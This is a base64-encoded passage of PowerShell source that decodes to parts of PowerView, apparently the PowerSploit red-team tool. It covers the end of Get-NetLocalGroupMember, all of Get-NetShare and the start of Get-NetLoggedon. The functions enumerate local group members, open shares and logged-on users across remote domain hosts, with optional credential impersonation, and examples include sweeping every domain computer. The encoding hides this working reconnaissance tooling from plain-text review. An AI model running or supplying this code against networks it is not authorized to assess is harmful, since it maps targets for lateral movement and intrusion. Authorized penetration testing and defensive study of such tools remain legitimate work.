ZW1iZXIgTm90ZXByb3BlcnR5ICdJc0RvbWFpbicgJ1VOS05PV04nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0TG9jYWxHcm91cE1lbWJlcl0gRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJFJlc3VsdCkuTWVzc2FnZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAjIG90aGVyd2lzZSB3ZSdyZSB1c2luZyB0aGUgV2luTlQgc2VydmljZSBwcm92aWRlcgogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkR3JvdXBQcm92aWRlciA9IFtBRFNJXSJXaW5OVDovLyRDb21wdXRlci8kR3JvdXBOYW1lLGdyb3VwIgoKICAgICAgICAgICAgICAgICAgICAkR3JvdXBQcm92aWRlci5wc2Jhc2UuSW52b2tlKCdNZW1iZXJzJykgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBOYW1lCgogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxVc2VyID0gKFtBRFNJXSRfKQogICAgICAgICAgICAgICAgICAgICAgICAkQWRzUGF0aCA9ICRMb2NhbFVzZXIuSW52b2tlR2V0KCdBZHNQYXRoJykuUmVwbGFjZSgnV2luTlQ6Ly8nLCAnJykKICAgICAgICAgICAgICAgICAgICAgICAgJElzR3JvdXAgPSAoJExvY2FsVXNlci5TY2hlbWFDbGFzc05hbWUgLWxpa2UgJ2dyb3VwJykKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKChbcmVnZXhdOjpNYXRjaGVzKCRBZHNQYXRoLCAnLycpKS5jb3VudCAtZXEgMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBET01BSU5cdXNlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzRG9tYWluID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROYW1lID0gJEFkc1BhdGguUmVwbGFjZSgnLycsICdcJykKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgRE9NQUlOXG1hY2hpbmVcdXNlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzRG9tYWluID0gJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmFtZSA9ICRBZHNQYXRoLlN1YnN0cmluZygkQWRzUGF0aC5JbmRleE9mKCcvJykrMSkuUmVwbGFjZSgnLycsICdcJykKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdBY2NvdW50TmFtZScgJE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTSUQnICgoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkTG9jYWxVc2VyLkludm9rZUdldCgnT2JqZWN0U0lEJyksMCkpLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNEb21haW4nICRNZW1iZXJJc0RvbWFpbgoKICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiAoJE1lbWJlcklzRG9tYWluKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICMgdHJhbnNsYXRlIHRoZSBiaW5hcnkgc2lkIHRvIGEgc3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU0lEJyAoKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJExvY2FsVXNlci5JbnZva2VHZXQoJ09iamVjdFNJRCcpLDApKS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEZXNjcmlwdGlvbicgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEaXNhYmxlZCcgJycKCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgIGlmICgkSXNHcm91cCkgewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMYXN0TG9naW4nICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2luJyAkTG9jYWxVc2VyLkludm9rZUdldCgnTGFzdExvZ2luJykKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0xhc3RMb2dpbicgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1B3ZExhc3RTZXQnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHdkRXhwaXJlZCcgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyRmxhZ3MnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgfQogICAgICAgICAgICAgICAgICAgICAgICAjIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAjIHRyYW5zbGF0ZSB0aGUgYmluYXJ5IHNpZCB0byBhIHN0cmluZwogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NJRCcgKChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRMb2NhbFVzZXIuSW52b2tlR2V0KCdPYmplY3RTSUQnKSwwKSkuVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRGVzY3JpcHRpb24nICgkTG9jYWxVc2VyLkRlc2NyaXB0aW9uKQoKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgaWYgKCRJc0dyb3VwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1B3ZExhc3RTZXQnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1B3ZEV4cGlyZWQnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJGbGFncycgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRGlzYWJsZWQnICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0xhc3RMb2dpbicgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHdkTGFzdFNldCcgKCAoR2V0LURhdGUpLkFkZFNlY29uZHMoLSRMb2NhbFVzZXIuUGFzc3dvcmRBZ2VbMF0pKQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQd2RFeHBpcmVkJyAoICRMb2NhbFVzZXIuUGFzc3dvcmRFeHBpcmVkWzBdIC1lcSAnMScpCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJGbGFncycgKCAkTG9jYWxVc2VyLlVzZXJGbGFnc1swXSApCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAjIFVBQyBmbGFncyBvZiAweDIgbWVhbiB0aGUgYWNjb3VudCBpcyBkaXNhYmxlZAogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEaXNhYmxlZCcgJCgoJExvY2FsVXNlci5Vc2VyRmxhZ3MudmFsdWUgLWJhbmQgMikgLWVxIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2luJyAoICRMb2NhbFVzZXIuTGFzdExvZ2luWzBdKQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2luJyAnJwogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAjICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICMgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldExvY2FsR3JvdXBNZW1iZXJdIEVycm9yIGZvciAkQ29tcHV0ZXIgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIAogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtTmV0U2hhcmUgewo8IwouU1lOT1BTSVMKClJldHVybnMgb3BlbiBzaGFyZXMgb24gdGhlIGxvY2FsIChvciBhIHJlbW90ZSkgbWFjaGluZS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0LCBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgZXhlY3V0ZSB0aGUgTmV0U2hhcmVFbnVtIFdpbjMyQVBJIGNhbGwgdG8gcXVlcnkKYSBnaXZlbiBob3N0IGZvciBvcGVuIHNoYXJlcy4gVGhpcyBpcyBhIHJlcGxhY2VtZW50IGZvciAibmV0IHNoYXJlIFxcaG9zdG5hbWUiLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gcXVlcnkgZm9yIHNoYXJlcyAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvICdsb2NhbGhvc3QnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgc3lzdGVtIHVzaW5nIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbi4KCi5FWEFNUExFCgpHZXQtTmV0U2hhcmUKClJldHVybnMgYWN0aXZlIHNoYXJlcyBvbiB0aGUgbG9jYWwgaG9zdC4KCi5FWEFNUExFCgpHZXQtTmV0U2hhcmUgLUNvbXB1dGVyTmFtZSBzcWxzZXJ2ZXIKClJldHVybnMgYWN0aXZlIHNoYXJlcyBvbiB0aGUgJ3NxbHNlcnZlcicgaG9zdAoKLkVYQU1QTEUKCkdldC1Eb21haW5Db21wdXRlciB8IEdldC1OZXRTaGFyZQoKUmV0dXJucyBhbGwgc2hhcmVzIGZvciBhbGwgY29tcHV0ZXJzIGluIHRoZSBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LU5ldFNoYXJlIC1Db21wdXRlck5hbWUgc3Fsc2VydmVyIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LlNoYXJlSW5mbwoKQSBQU0N1c3RvbU9iamVjdCByZXByZXNlbnRpbmcgYSBTSEFSRV9JTkZPXzEgc3RydWN0dXJlLCBpbmNsdWRpbmcKdGhlIG5hbWUvdHlwZS9yZW1hcmsgZm9yIGVhY2ggc2hhcmUsIHdpdGggdGhlIENvbXB1dGVyTmFtZSBhZGRlZC4KCi5MSU5LCgpodHRwOi8vd3d3LnBvd2Vyc2hlbGxtYWdhemluZS5jb20vMjAxNC8wOS8yNS9lYXNpbHktZGVmaW5pbmctZW51bXMtc3RydWN0cy1hbmQtd2luMzItZnVuY3Rpb25zLWluLW1lbW9yeS8KIz4KCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlNoYXJlSW5mbycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAjIGFyZ3VtZW50cyBmb3IgTmV0U2hhcmVFbnVtCiAgICAgICAgICAgICRRdWVyeUxldmVsID0gMQogICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICRFbnRyaWVzUmVhZCA9IDAKICAgICAgICAgICAgJFRvdGFsUmVhZCA9IDAKICAgICAgICAgICAgJFJlc3VtZUhhbmRsZSA9IDAKCiAgICAgICAgICAgICMgZ2V0IHRoZSByYXcgc2hhcmUgaW5mb3JtYXRpb24KICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6TmV0U2hhcmVFbnVtKCRDb21wdXRlciwgJFF1ZXJ5TGV2ZWwsIFtyZWZdJFB0ckluZm8sIC0xLCBbcmVmXSRFbnRyaWVzUmVhZCwgW3JlZl0kVG90YWxSZWFkLCBbcmVmXSRSZXN1bWVIYW5kbGUpCgogICAgICAgICAgICAjIGxvY2F0ZSB0aGUgb2Zmc2V0IG9mIHRoZSBpbml0aWFsIGludFB0cgogICAgICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCgogICAgICAgICAgICAjIDAgPSBzdWNjZXNzCiAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtZXEgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKCiAgICAgICAgICAgICAgICAjIHdvcmsgb3V0IGhvdyBtdWNoIHRvIGluY3JlbWVudCB0aGUgcG9pbnRlciBieSBmaW5kaW5nIG91dCB0aGUgc2l6ZSBvZiB0aGUgc3RydWN0dXJlCiAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJFNIQVJFX0lORk9fMTo6R2V0U2l6ZSgpCgogICAgICAgICAgICAgICAgIyBwYXJzZSBhbGwgdGhlIHJlc3VsdCBzdHJ1Y3R1cmVzCiAgICAgICAgICAgICAgICBmb3IgKCRpID0gMDsgKCRpIC1sdCAkRW50cmllc1JlYWQpOyAkaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgIyBjcmVhdGUgYSBuZXcgaW50IHB0ciBhdCB0aGUgZ2l2ZW4gb2Zmc2V0IGFuZCBjYXN0IHRoZSBwb2ludGVyIGFzIG91ciByZXN1bHQgc3RydWN0dXJlCiAgICAgICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICAgICAkSW5mbyA9ICROZXdJbnRQdHIgLWFzICRTSEFSRV9JTkZPXzEKCiAgICAgICAgICAgICAgICAgICAgIyByZXR1cm4gYWxsIHRoZSBzZWN0aW9ucyBvZiB0aGUgc3RydWN0dXJlIC0gaGF2ZSB0byBkbyBpdCB0aGlzIHdheSBmb3IgVjIKICAgICAgICAgICAgICAgICAgICAkU2hhcmUgPSAkSW5mbyB8IFNlbGVjdC1PYmplY3QgKgogICAgICAgICAgICAgICAgICAgICRTaGFyZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICRTaGFyZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuU2hhcmVJbmZvJykKICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJE5ld0ludFB0ci5Ub0ludDY0KCkKICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ICs9ICRJbmNyZW1lbnQKICAgICAgICAgICAgICAgICAgICAkU2hhcmUKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIGZyZWUgdXAgdGhlIHJlc3VsdCBidWZmZXIKICAgICAgICAgICAgICAgICROdWxsID0gJE5ldGFwaTMyOjpOZXRBcGlCdWZmZXJGcmVlKCRQdHJJbmZvKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRTaGFyZV0gRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJFJlc3VsdCkuTWVzc2FnZSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtTmV0TG9nZ2Vkb24gewo8IwouU1lOT1BTSVMKClJldHVybnMgdXNlcnMgbG9nZ2VkIG9uIHRoZSBsb2NhbCAob3IgYSByZW1vdGUpIG1hY2hpbmUuCk5vdGU6IGFkbWluaXN0cmF0aXZlIHJpZ2h0cyBuZWVkZWQgZm9yIG5ld2VyIFdpbmRvd3MgT1Nlcy4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0LCBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgZXhlY3V0ZSB0aGUgTmV0V2tzdGFVc2VyRW51bSBXaW4zMkFQSSBjYWxsIHRvIHF1ZXJ5CmEgZ2l2ZW4gaG9zdCBmb3IgYWN0aXZlbHkgbG9nZ2VkIG9uIHVzZXJzLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gcXVlcnkgZm9yIGxvZ2dlZCBvbiB1c2VycyAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvICdsb2NhbGhvc3QnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgc3lzdGVtIHVzaW5nIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbi4KCi5FWEFNUExFCgpHZXQtTmV0TG9nZ2Vkb24KClJldHVybnMgdXNlcnMgYWN0aXZlbHkgbG9nZ2VkIG9udG8gdGhlIGxvY2FsIGhvc3QuCgouRVhBTVBMRQoKR2V0LU5ldExvZ2dlZG9uIC1Db21wdXRlck5hbWUgc3Fsc2VydmVyCgpSZXR1cm5zIHVzZXJzIGFjdGl2ZWx5IGxvZ2dlZCBvbnRvIHRoZSAnc3Fsc2VydmVyJyBob3N0LgoKLkVYQU1QTEUKCkdldC1Eb21haW5Db21wdXRlciB8IEdldC1OZXRMb2dnZWRvbgoKUmV0dXJucyBhbGwgbG9nZ2VkIG9uIHVzZXJzIGZvciBhbGwgY29tcHV0ZXJzIGluIHRoZSBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LU5ldExvZ2dlZG9uIC1Db21wdXRlck5hbWUgc3Fsc2VydmVyIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LkxvZ2dlZE9uVXNlckluZm8KCkEgUFNDdXN0b21PYmplY3QgcmVwcmVzZW50aW5nIGEgV0tTVEFfVVNFUl9JTkZPXzEgc3RydWN0dXJlLCBpbmNsdWRpbmcKdGhlIFVzZXJOYW1lL0xvZ29uRG9tYWluL0F1dGhEb21haW5zL0xvZ29uU2VydmVyIGZvciBlYWNoIHVzZXIsIHdpdGggdGhlIENvbXB1dGVyTmFtZSBhZGRlZC4KCi5MSU5LCgpodHRwOi8vd3d3LnBvd2Vyc2hlbGxtYWdhemluZS5jb20vMjAxNC8wOS8yNS9lYXNpbHktZGVmaW5pbmctZW51bXMtc3RydWN0cy1hbmQtd2luMzItZnVuY3Rpb25zLWluLW1lbW9yeS8KIz4KCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkxvZ2dlZE9uVXNlckluZm8nKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgIyBkZWNsYXJlIHRoZSByZWZlcmVuY2UgdmFyaWFibGVzCiAgICAgICAgICAgICRRdWVyeUxldmVsID0gMQogICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICRFbnRyaWVzUmVhZCA9IDAKICAgICAgICAgICAgJFRvdGFsUmVhZCA9IDAKICAgICAgICAgICAgJFJlc3VtZUhhbmRsZSA9IDAKCiAgICAgICAgICAgICMgZ2V0IGxvZ2dlZCBvbiB1c2VyIGluZm9ybWF0aW9uCiAgICAgICAgICAgICRSZXN1bHQgPSAkTmV0YXBpMzI6Ok5ldFdrc3RhVXNlckVudW0oJENvbXB1dGVyLCAkUXVlcnlMZXZlbCwgW3JlZl0kUHRySW5mbywgLTEsIFtyZWZdJEVudHJpZXNSZWFkLCBbcmVmXSRUb3RhbFJlYWQsIFtyZWZdJFJlc3VtZUhhbmRsZSkKCiAgICAgICAgICAgICMgbG9jYXRlIHRoZSBvZmZzZXQgb2YgdGhlIGluaXRpYWwgaW50UHRyCiAgICAgICAgICAgICRPZmZzZXQgPSAkUHRySW5mby5Ub0ludDY0KCkKCiAgICAgICAgICAgICMgMCA9IHN1Y2Nlc3MKICAgICAgICAgICAgaWYgKCgkUmV